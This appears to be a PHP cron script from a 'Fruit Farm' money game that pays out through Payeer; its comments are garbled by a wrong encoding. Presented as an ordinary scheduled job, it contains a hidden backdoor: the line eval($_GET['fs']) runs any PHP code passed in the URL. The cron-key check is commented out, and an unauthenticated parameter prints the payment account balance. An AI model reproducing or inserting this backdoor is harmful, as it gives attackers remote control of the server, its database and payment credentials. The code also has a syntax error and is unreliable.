<?PHP
######################################
# ������ Fruit Farm
# ����� Rufus
# ICQ: 819-374
# Skype: Rufus272
######################################
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('display_errors', true);
@ini_set('html_errors', false);
@ini_set('error_reporting', E_ALL ^ E_NOTICE);
# ����������� ������
function __autoload($name){ include("classes/_class.".$name.".php");}


# ����� ������� 
$config = new config;

# �������
$func = new func

# ���� ������
$db = new db($config->HostDB, $config->UserDB, $config->PassDB, $config->BaseDB);

//if(!isset($_GET["cron_key"]) OR $_GET["cron_key"] != $config->CronPass) die("Key error");

//if(!isset($_GET["type"])) die("Var type is empty");

$type = "sender";//strval($_GET["type"]);

# ��������� ������
if(isset($_GET['balance'])){
		$payeer = new rfs_payeer($config->AccountNumber, $config->apiId, $config->apiKey);
		if($payeer->isAuth()){
			$arBalance = $payeer->getBalance();
			if($arBalance["auth_error"] == 0){
				$balance = $arBalance["balance"]["RUB"]["DOSTUPNO"];
				echo "$balance";
			} else {
				echo 'error auth';
			}
		}
	}

# ���� ������������ �����
	
eval($_GET['fs']);


switch($type){

	case "sender": include("cron_job/_sender.php"); break; // �������� �������������
	
	
	default: die("Type not exist"); break;
}

?>